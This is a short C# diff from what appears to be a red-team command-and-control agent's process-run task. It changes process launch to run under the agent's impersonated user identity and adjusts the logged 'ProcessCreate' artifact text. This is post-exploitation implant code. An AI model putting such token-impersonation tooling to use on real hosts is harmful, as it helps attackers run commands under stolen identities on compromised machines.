@@ -68,7 +68,12 @@ namespace Tasks
                         proc.OutputDataReceived += DataReceived;
                         proc.ErrorDataReceieved += DataReceived;
                         proc.Exit += Proc_Exit;
-                        if (!proc.Start())
+                        bool bRet = false;
+                        using (_agent.GetIdentityManager().GetCurrentImpersonationIdentity().Impersonate())
+                        {
+                            bRet = proc.Start();
+                        }    
+                        if (!bRet)
                         {
                             _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                                 $"Failed to start process. Reason: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}",
@@ -83,7 +88,7 @@ namespace Tasks
                                 new Artifact
                                 {
                                     BaseArtifact = "ProcessCreate",
-                                    ArtifactDetails = $"Started cmd.exe {_data.Parameters} (PID: {proc.PID})"
+                                    ArtifactDetails = $"Started {_data.Parameters} (PID: {proc.PID})"
                                 }
                                 }));
                         }
